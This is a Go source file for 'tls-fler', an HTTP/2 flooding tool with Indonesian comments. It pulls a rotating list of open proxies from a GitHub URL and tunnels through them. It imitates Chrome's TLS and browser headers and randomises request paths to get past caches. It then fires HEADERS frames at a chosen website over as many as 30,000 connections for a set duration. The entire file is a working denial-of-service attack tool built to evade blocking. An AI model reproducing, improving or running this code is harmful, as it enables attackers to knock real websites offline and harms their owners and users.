package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
)

const (
	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
	h2Preface   = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
	mejiChars   = "abcdefghijklmnopqrstuvwxyz0123456789"
)

var (
	statTotal   int64
	statSuccess int64
	statFailed  int64
)

var uaList = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
}

var brandList = []string{
	`"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`,
	`"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"`,
	`"Chromium";v="134", "Not=A?Brand";v="24", "Google Chrome";v="134"`,
}

var mejiSuffixes = []string{
	"", "App", "Load", "Ts", "Req", "Id", "Cache", "Rand", "Hit", "Src",
	"Tk", "Ver", "Sid", "Uid", "Tag", "Ctx", "Ref", "Env", "Run", "Seq",
}

// ── proxy pool ────────────────────────────────────────────────────────────────
type proxy struct{ host, port, user, pass string }

type proxyPool struct {
	mu   sync.RWMutex
	list []proxy
	fp   string
}

func parseProxies(r io.Reader) []proxy {
	var out []proxy
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		line := strings.TrimSpace(sc.Text())
		if line == "" {
			continue
		}
		p := strings.Split(line, ":")
		if len(p) < 2 {
			continue
		}
		px := proxy{host: p[0], port: p[1]}
		if len(p) >= 4 {
			px.user = p[2]
			px.pass = p[3]
		}
		out = append(out, px)
	}
	return out
}

func fp(list []proxy) string {
	parts := make([]string, len(list))
	for i, p := range list {
		parts[i] = p.host + ":" + p.port
	}
	return strings.Join(parts, "|")
}

func newProxyPool(localPath string) (*proxyPool, error) {
	pp := &proxyPool{}

	resp, err := http.Get(proxyGitURL)
	if err == nil && resp.StatusCode == 200 {
		list := parseProxies(resp.Body)
		resp.Body.Close()
		if len(list) > 0 {
			pp.list = list
			pp.fp = fp(list)
			saveLocal(localPath, list)
			fmt.Printf("[proxy] loaded %d proxies from GitHub\n", len(list))
			return pp, nil
		}
	}

	f, err2 := os.Open(localPath)
	if err2 != nil {
		return nil, fmt.Errorf("cannot load proxies (github: %v, local: %v)", err, err2)
	}
	defer f.Close()
	list := parseProxies(f)
	if len(list) == 0 {
		return nil, fmt.Errorf("proxy file is empty")
	}
	pp.list = list
	pp.fp = fp(list)
	fmt.Printf("[proxy] loaded %d proxies from local file\n", len(list))
	return pp, nil
}

func saveLocal(path string, list []proxy) {
	f, err := os.Create(path)
	if err != nil {
		return
	}
	defer f.Close()
	for _, p := range list {
		if p.user != "" {
			fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
		} else {
			fmt.Fprintf(f, "%s:%s\n", p.host, p.port)
		}
	}
}

func (pp *proxyPool) autoUpdate(localPath string) {
	for range time.NewTicker(30 * time.Second).C {
		resp, err := http.Get(proxyGitURL)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		list := parseProxies(resp.Body)
		resp.Body.Close()
		if len(list) == 0 {
			continue
		}
		newFP := fp(list)
		pp.mu.Lock()
		if newFP != pp.fp {
			pp.list = list
			pp.fp = newFP
			fmt.Printf("[proxy] updated: %d proxies\n", len(list))
			saveLocal(localPath, list)
		}
		pp.mu.Unlock()
	}
}

func (pp *proxyPool) random() proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.list[rand.Intn(len(pp.list))]
}

func (pp *proxyPool) count() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return len(pp.list)
}

// ── helpers ───────────────────────────────────────────────────────────────────
func randStr(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = mejiChars[rand.Intn(len(mejiChars))]
	}
	return string(b)
}

func resolveRand(s string) string {
	for strings.Contains(s, "%RAND%") {
		s = strings.Replace(s, "%RAND%", randStr(rand.Intn(9)+8), 1)
	}
	return s
}

func randomQuery() string {
	n := rand.Intn(3) + 1
	pairs := make([]string, 0, n)
	used := map[string]bool{}
	for i := 0; i < n; i++ {
		var key string
		for {
			key = "meji" + mejiSuffixes[rand.Intn(len(mejiSuffixes))]
			if !used[key] {
				used[key] = true
				break
			}
		}
		pairs = append(pairs, key+"="+randStr(rand.Intn(8)+4))
	}
	return strings.Join(pairs, "&")
}

func buildPath(u *url.URL) string {
	p := u.Path
	if p == "" {
		p = "/"
	}
	p = resolveRand(p)
	sep := "?"
	if strings.Contains(p, "?") {
		sep = "&"
	}
	return p + sep + randomQuery()
}

// ── HTTP/2 frame helpers ──────────────────────────────────────────────────────
func h2Frame(streamID uint32, t uint8, flags uint8, payload []byte) []byte {
	buf := make([]byte, 9+len(payload))
	buf[0] = byte(len(payload) >> 16)
	buf[1] = byte(len(payload) >> 8)
	buf[2] = byte(len(payload))
	buf[3] = t
	buf[4] = flags
	binary.BigEndian.PutUint32(buf[5:], streamID&0x7FFFFFFF)
	copy(buf[9:], payload)
	return buf
}

func settingsPayload() []byte {
	s := [][2]uint32{{1, 65536}, {2, 0}, {4, 6291456}, {6, 262144}}
	buf := make([]byte, 6*len(s))
	for i, v := range s {
		binary.BigEndian.PutUint16(buf[i*6:], uint16(v[0]))
		binary.BigEndian.PutUint32(buf[i*6+2:], v[1])
	}
	return buf
}

func winUpdatePayload(inc uint32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, inc)
	return b
}

// ── proxy CONNECT → TLS ───────────────────────────────────────────────────────
func dialTLS(px proxy, host string, port int) (net.Conn, error) {
	raw, err := net.DialTimeout("tcp", net.JoinHostPort(px.host, px.port), 10*time.Second)
	if err != nil {
		return nil, err
	}

	connectReq := fmt.Sprintf(
		"CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\nProxy-Connection: Keep-Alive\r\n",
		host, port, host, port,
	)
	if px.user != "" {
		auth := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
		connectReq += "Proxy-Authorization: Basic " + auth + "\r\n"
	}
	connectReq += "\r\n"

	if _, err := raw.Write([]byte(connectReq)); err != nil {
		raw.Close()
		return nil, err
	}

	// read proxy response
	br := bufio.NewReader(raw)
	resp, err := http.ReadResponse(br, nil)
	if err != nil {
		raw.Close()
		return nil, err
	}
	resp.Body.Close()
	if resp.StatusCode != 200 {
		raw.Close()
		return nil, fmt.Errorf("proxy CONNECT: %s", resp.Status)
	}

	tlsConn := tls.Client(raw, &tls.Config{
		ServerName:         host,
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
		MinVersion:         tls.VersionTLS12,
		MaxVersion:         tls.VersionTLS13,
		CurvePreferences:   []tls.CurveID{tls.X25519, tls.CurveP256},
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	})
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, err
	}
	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
		tlsConn.Close()
		return nil, fmt.Errorf("h2 not negotiated")
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, nil
}

// ── HTTP/2 session — kirim frames secepat mungkin, mirip JS ──────────────────
func h2Session(conn net.Conn, u *url.URL, ratelimit int, deadline time.Time) {
	defer conn.Close()

	// send preface
	var buf bytes.Buffer
	buf.WriteString(h2Preface)
	buf.Write(h2Frame(0, 0x4, 0, settingsPayload()))        // SETTINGS
	buf.Write(h2Frame(0, 0x8, 0, winUpdatePayload(15663105))) // WINDOW_UPDATE
	if _, err := conn.Write(buf.Bytes()); err != nil {
		return
	}

	// reader goroutine — drain server frames, reply to SETTINGS/PING
	go func() {
		br := bufio.NewReaderSize(conn, 32*1024)
		hdr := make([]byte, 9)
		dec := hpack.NewDecoder(4096, nil)
		for {
			if _, err := io.ReadFull(br, hdr); err != nil {
				return
			}
			length := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
			ft := hdr[3]
			flags := hdr[4]
			payload := make([]byte, length)
			if length > 0 {
				if _, err := io.ReadFull(br, payload); err != nil {
					return
				}
			}

			switch ft {
			case 0x4: // SETTINGS
				if flags&0x1 == 0 {
					conn.Write(h2Frame(0, 0x4, 0x1, nil)) // ACK
				}
			case 0x6: // PING
				conn.Write(h2Frame(0, 0x6, 0x1, payload)) // PONG
			case 0x7: // GOAWAY
				conn.Close()
				return
			case 0x1: // HEADERS — count status
				hdrs, err := dec.DecodeFull(payload)
				if err != nil {
					continue
				}
				for _, h := range hdrs {
					if h.Name == ":status" {
						code, _ := strconv.Atoi(h.Value)
						if code >= 200 && code < 500 {
							atomic.AddInt64(&statSuccess, 1)
						} else {
							atomic.AddInt64(&statFailed, 1)
						}
					}
				}
			}
		}
	}()

	// writer — kirim HEADERS frames secepat mungkin sesuai ratelimit
	// interval per request
	interval := time.Duration(0)
	if ratelimit > 0 {
		interval = time.Second / time.Duration(ratelimit)
	}

	streamID := uint32(1)
	var hpackBuf bytes.Buffer
	enc := hpack.NewEncoder(&hpackBuf)

	for time.Now().Before(deadline) {
		ua := uaList[rand.Intn(len(uaList))]
		brand := brandList[rand.Intn(len(brandList))]
		isMobile := rand.Intn(100) < 40
		mobile := "?0"
		platform := `"Windows"`
		if isMobile {
			mobile = "?1"
			platform = `"Android"`
		}
		cacheCtrl := "no-cache"
		if rand.Intn(2) == 0 {
			cacheCtrl = "max-age=0"
		}

		path := buildPath(u)

		hpackBuf.Reset()
		for _, h := range []hpack.HeaderField{
			{Name: ":method", Value: "GET"},
			{Name: ":authority", Value: u.Hostname()},
			{Name: ":scheme", Value: "https"},
			{Name: ":path", Value: path},
			{Name: "cache-control", Value: cacheCtrl},
			{Name: "sec-ch-ua", Value: brand},
			{Name: "sec-ch-ua-mobile", Value: mobile},
			{Name: "sec-ch-ua-platform", Value: platform},
			{Name: "upgrade-insecure-requests", Value: "1"},
			{Name: "user-agent", Value: ua},
			{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			{Name: "sec-fetch-site", Value: "none"},
			{Name: "sec-fetch-mode", Value: "navigate"},
			{Name: "sec-fetch-user", Value: "?1"},
			{Name: "sec-fetch-dest", Value: "document"},
			{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
			{Name: "accept-language", Value: "en-US,en;q=0.9"},
			{Name: "priority", Value: "u=0, i"},
		} {
			enc.WriteField(h)
		}

		// HEADERS frame: END_HEADERS(0x4) | END_STREAM(0x1) | PRIORITY(0x20)
		encoded := hpackBuf.Bytes()
		payload := make([]byte, 5+len(encoded))
		payload[0] = 0x80
		copy(payload[5:], encoded)

		frame := h2Frame(streamID, 0x1, 0x1|0x4|0x20, payload)
		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write(frame); err != nil {
			return
		}

		atomic.AddInt64(&statTotal, 1)
		streamID += 2

		if interval > 0 {
			time.Sleep(interval)
		}
	}
}

// ── go: setiap goroutine buka conn baru terus menerus (mirip JS setInterval) ──
func spawnConn(pool *proxyPool, u *url.URL, port int, ratelimit int, deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()
	for time.Now().Before(deadline) {
		px := pool.random()
		conn, err := dialTLS(px, u.Hostname(), port)
		if err != nil {
			atomic.AddInt64(&statFailed, 1)
			continue
		}
		h2Session(conn, u, ratelimit, deadline)
	}
}

// ── main ──────────────────────────────────────────────────────────────────────
func main() {
	if len(os.Args) < 4 {
		fmt.Println("Usage: tls-fler <url> <duration_seconds> <rate_per_second> [proxy/global.txt]")
		fmt.Println("Example: ./tls-fler https://example.com 60 50000")
		fmt.Println("         ./tls-fler https://example.com/%RAND% 60 50000 proxy/global.txt")
		os.Exit(1)
	}

	targetRaw := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Fprintln(os.Stderr, "Error: duration must be a positive integer")
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Fprintln(os.Stderr, "Error: rate must be a positive integer")
		os.Exit(1)
	}

	localProxyPath := "proxy/global.txt"
	if len(os.Args) >= 5 {
		localProxyPath = os.Args[4]
	}

	u, err := url.Parse(targetRaw)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: invalid URL: %v\n", err)
		os.Exit(1)
	}

	pool, err := newProxyPool(localProxyPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Error: %v\n", err)
		os.Exit(1)
	}
	go pool.autoUpdate(localProxyPath)

	port := 443
	if p := u.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}

	// Gunakan semua CPU core
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Jumlah goroutine koneksi — mirip JS: 30000 conns tapi batasi wajar
	// 1 goroutine = 1 koneksi aktif. Rate dibagi per-goroutine.
	// Target: setiap goroutine kirim ~128 req/s (sama seperti JS ratelimit default)
	conns := rate / 128
	if conns < 1 {
		conns = 1
	}
	if conns > 30000 {
		conns = 30000
	}
	perConn := rate / conns
	if perConn < 1 {
		perConn = 1
	}

	dur := time.Duration(duration) * time.Second
	deadline := time.Now().Add(dur)

	fmt.Printf("[tls-fler] target=%s duration=%ds rate=%d/s conns=%d proxies=%d\n",
		u, duration, rate, conns, pool.count())

	start := time.Now()
	var wg sync.WaitGroup
	for i := 0; i < conns; i++ {
		wg.Add(1)
		go spawnConn(pool, u, port, perConn, deadline, &wg)
	}
	wg.Wait()

	elapsed := time.Since(start).Seconds()
	fmt.Println("\n========== SUMMARY ==========")
	fmt.Printf("Target    : %s\n", u)
	fmt.Printf("Duration  : %.2fs\n", elapsed)
	fmt.Printf("Total Req : %d\n", statTotal)
	fmt.Printf("Success   : %d\n", statSuccess)
	fmt.Printf("Failed    : %d\n", statFailed)
	fmt.Printf("Avg Rate  : %.2f req/s\n", float64(statTotal)/elapsed)
	fmt.Println("=============================")
}
